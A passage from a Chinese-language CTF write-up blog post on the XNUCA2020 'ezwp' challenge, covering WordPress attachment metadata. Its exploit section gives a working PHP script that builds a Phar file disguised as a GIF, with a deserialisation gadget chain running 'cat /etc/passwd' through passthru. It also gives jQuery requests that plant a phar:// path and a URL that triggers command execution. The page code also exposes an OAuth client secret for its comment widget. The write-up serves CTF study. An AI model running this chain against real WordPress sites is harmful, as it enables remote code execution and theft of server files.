*</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 2.1.0</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> int   $attachment_id Attachment post ID.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> array $data          Attachment meta data.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> int|bool False if $post is invalid.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">wp_update_attachment_metadata</span>(<span class="params"> <span class="variable">$attachment_id</span>, <span class="variable">$data</span> </span>) </span>&#123;</span><br><span class="line">	<span class="variable">$attachment_id</span> = (<span class="keyword">int</span>) <span class="variable">$attachment_id</span>;</span><br><span class="line"></span><br><span class="line">	<span class="variable">$post</span> = <span class="title function_ invoke__">get_post</span>(<span class="variable">$attachment_id</span> );</span><br><span class="line">	<span class="keyword">if</span> (! <span class="variable">$post</span> ) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * Filters the updated attachment meta data.</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@since</span> 2.1.0</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> array $data          Array of updated attachment meta data.</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> int   $attachment_id Attachment post ID.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="variable">$data</span> = <span class="title function_ invoke__">apply_filters</span>(<span class="string">&#x27;wp_update_attachment_metadata&#x27;</span>, <span class="variable">$data</span>, <span class="variable">$post</span>-&gt;ID );</span><br><span class="line">	<span class="keyword">if</span> (<span class="variable">$data</span> ) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="title function_ invoke__">update_post_meta</span>(<span class="variable">$post</span>-&gt;ID, <span class="string">&#x27;_wp_attachment_metadata&#x27;</span>, <span class="variable">$data</span> );</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="title function_ invoke__">delete_post_meta</span>(<span class="variable">$post</span>-&gt;ID, <span class="string">&#x27;_wp_attachment_metadata&#x27;</span> );</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p> 直接通过 update_post_meta 更新 _wp_attachment_metadata 字段，导致 imagedata 可控。</p>
<h1 id="0x5-Exploit"><a href="#0x5-Exploit" class="headerlink" title="0x5 Exploit"></a>0x5 Exploit</h1><p> 首先需要生成一个 Phar 文件，但是 WordPress 并不傻，Phar 这种很容易被反序列化的文件 WordPress 肯定是不让直接上传的，因此这里就需要先将 Phar 文件伪装成 gif 文件之后才可以直接上传，但是序列化后的字符串还存在与该 gif 文件中，在 phar 伪协议读取该 gif 文件的时候仍旧可以触发反序列化。另外 WordPress 会拦截上传文件中的 php 代码，如果直接将 <code>&lt;?php __HALT_COMPILER (); ?&gt;</code> 写入 gif 文件中会被 WordPress 拦截，因此可以使用短标签即可绕过。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Requests_Utility_FilteredIterator</span> <span class="keyword">extends</span> <span class="title">ArrayIterator</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$callback</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$data</span>, <span class="variable">$callback</span></span>) </span>&#123;</span><br><span class="line">        <span class="built_in">parent</span>::<span class="title function_ invoke__">__construct</span>(<span class="variable">$data</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;callback = <span class="variable">$callback</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Ai1ec_Shutdown_Controller</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$_preserve</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;_preserve = <span class="keyword">new</span> <span class="title class_">Requests_Utility_FilteredIterator</span>(<span class="keyword">array</span>(<span class="string">&#x27;cat /etc/passwd&#x27;</span>), <span class="string">&#x27;passthru&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;a.gif&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;a.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;GIF89a&quot;</span>.<span class="string">&quot;&lt;? __HALT_COMPILER (); ?&gt;&quot;</span>);  <span class="comment">// Short tag.</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="keyword">new</span> <span class="title class_">Ai1ec_Shutdown_Controller</span>());</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="title function_ invoke__">rename</span>(<span class="string">&#x27;a.phar&#x27;</span>, <span class="string">&#x27;a.gif&#x27;</span>);</span><br></pre></td></tr></table></figure>



<p> 生成好 gif 以后上传该文件，上传成功以后就可以拿到该文件的 id。</p>
<p><img src="/2020/12/10/XNUCA2020-ezwp-Writeup/3.png"></p>
<p>WordPress 为了防御 CSRF，在每一个页面都加入了一个 nonce 以及对 referer 的验证，所以我们还需要拿到 nonce 才能发送 post 请求。注意每个页面的 nonce 都不同，这里需要 edit 页面的 nonce，如下所示。</p>
<p><img src="/2020/12/10/XNUCA2020-ezwp-Writeup/4.png"></p>
<p><img src="/2020/12/10/XNUCA2020-ezwp-Writeup/5.png"></p>
<p> 为了避免登陆 cookie 的麻烦，直接使用 ajax 发送请求，当然使用 python 也可以，将下面的 exp 配置修改完成后粘贴到浏览器控制台执行即可，如果下面的 exp 返回了错误的结果（例如 403），那么可能是由于 nonce 或者 id 错误。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> nonce = <span class="string">&quot;37e43b20f4&quot;</span></span><br><span class="line"><span class="keyword">var</span> id = <span class="string">&quot;9&quot;</span></span><br><span class="line"><span class="keyword">var</span> thumb = <span class="string">&quot;phar://../wp-content/uploads/2020/12/a.gif/test.txt&quot;</span></span><br><span class="line"><span class="keyword">var</span> ip = <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line"><span class="comment">//var ip = &quot;172.16.9.51&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//_wp_attached_file</span></span><br><span class="line"><span class="keyword">var</span> settings = &#123;</span><br><span class="line">    <span class="string">&quot;url&quot;</span>: <span class="string">&quot;http://&quot;</span> + ip + <span class="string">&quot;/wp-admin/post.php&quot;</span>,</span><br><span class="line">    <span class="string">&quot;method&quot;</span>: <span class="string">&quot;POST&quot;</span>,</span><br><span class="line">    <span class="string">&quot;data&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;_wpnonce&quot;</span>: nonce,</span><br><span class="line">        <span class="string">&quot;_wp_http_referer&quot;</span>: <span class="string">&quot;/wp-admin/post.php?post=&quot;</span> + id +<span class="string">&quot;&amp;action=edit&quot;</span>,</span><br><span class="line">        <span class="string">&quot;action&quot;</span>: <span class="string">&quot;editpost&quot;</span>,</span><br><span class="line">        <span class="string">&quot;post_type&quot;</span>:<span class="string">&quot;attachment&quot;</span>,</span><br><span class="line">        <span class="string">&quot;post_ID&quot;</span>:id,</span><br><span class="line">        <span class="string">&quot;file&quot;</span>:<span class="string">&quot;Z:\\Z&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">jQuery.<span class="title function_">ajax</span>(settings).<span class="title function_">done</span>(<span class="keyword">function</span> (<span class="params">response</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(response);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">//_wp_attachment_metadata</span></span><br><span class="line"><span class="keyword">var</span> settings = &#123;</span><br><span class="line">    <span class="string">&quot;url&quot;</span>: <span class="string">&quot;http://&quot;</span> + ip + <span class="string">&quot;/wp-admin/post.php&quot;</span>,</span><br><span class="line">    <span class="string">&quot;method&quot;</span>: <span class="string">&quot;POST&quot;</span>,</span><br><span class="line">    <span class="string">&quot;data&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;_wpnonce&quot;</span>: nonce,</span><br><span class="line">        <span class="string">&quot;_wp_http_referer&quot;</span>: <span class="string">&quot;/wp-admin/post.php?post=&quot;</span> + id +<span class="string">&quot;&amp;action=edit&quot;</span>,</span><br><span class="line">        <span class="string">&quot;action&quot;</span>: <span class="string">&quot;editattachment&quot;</span>,</span><br><span class="line">        <span class="string">&quot;post_ID&quot;</span>:id,</span><br><span class="line">        <span class="string">&quot;thumb&quot;</span>:thumb</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">jQuery.<span class="title function_">ajax</span>(settings).<span class="title function_">done</span>(<span class="keyword">function</span> (<span class="params">response</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(response);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>



<p> 上面的 exp 执行完成后 _wp_attachment_metadata 与 _wp_attached_file 字段就修改完成了。</p>
<p><img src="/2020/12/10/XNUCA2020-ezwp-Writeup/7.png"></p>
<p> 最后访问页面 <code>/wp-admin/media.php?attachment_id=9&amp;action=edit</code> 就可以触发反序列化执行命令获取输出。</p>
<p><img src="/2020/12/10/XNUCA2020-ezwp-Writeup/6.png"></p>
<h1 id="0x6-Contact-Form-7"><a href="#0x6-Contact-Form-7" class="headerlink" title="0x6 Contact-Form-7"></a>0x6 Contact-Form-7</h1>
    </div>

    
    
    

      <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/WriteUp/" rel="tag"># WriteUp</a>
          </div>

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/2020/10/26/Signal-CheatSheet/" rel="prev" title="Signal CheatSheet">
      <i class="fa fa-chevron-left"></i> Signal CheatSheet
    </a></div>
      <div class="post-nav-item">
    <a href="/2021/08/10/Register-CheatSheet/" rel="next" title="Register CheatSheet">
      Register CheatSheet <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  

  </div>


          </div>
          
    <div class="comments" id="gitalk-container"></div>

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x0-WordPress"><span class="nav-number">1.</span> <span class="nav-text">0x0 WordPress</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x1-Unserialize-POP-Chain"><span class="nav-number">2.</span> <span class="nav-text">0x1 Unserialize POP Chain</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x2-Exploit-Chain"><span class="nav-number">3.</span> <span class="nav-text">0x2  Exploit Chain</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x3-wp-attached-file"><span class="nav-number">4.</span> <span class="nav-text">0x3 wp_attached_file</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x4-wp-attachment-metadata"><span class="nav-number">5.</span> <span class="nav-text">0x4 wp_attachment_metadata</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x5-Exploit"><span class="nav-number">6.</span> <span class="nav-text">0x5 Exploit</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x6-Contact-Form-7"><span class="nav-number">7.</span> <span class="nav-text">0x6 Contact-Form-7</span></a></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">Srpopty</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">37</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">6</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">12</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <a href="https://github.com/Srpopty" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;Srpopty" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="mailto:srpopty@outlook.com" title="E-Mail → mailto:srpopty@outlook.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
      </span>
  </div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

<div class="copyright">
  
  &copy; 2016 – 
  <span itemprop="copyrightYear">2023</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Srpopty</span>
</div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/muse.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

  

<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.css">

<script>
NexT.utils.loadComments(document.querySelector('#gitalk-container'), () => {
  NexT.utils.getScript('//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js', () => {
    var gitalk = new Gitalk({
      clientID    : 'fb9b672afa74e328fbe8',
      clientSecret: '7b3efe103d7e694008b943a67e5273ad36ee14a0',
      repo        : 'srpopty.github.io',
      owner       : 'Srpopty',
      admin       : ['Srpopty'],
      id          : '3d9f50820fda5cb840d8bae2f50b6020',
        language: 'zh-CN',
      distractionFreeMode: true
    });
    gitalk.render('gitalk-container');
  }, window.Gitalk);
});
</script><!-- hexo-inject:begin --><!-- hexo-inject:end -->

</body>
</html>
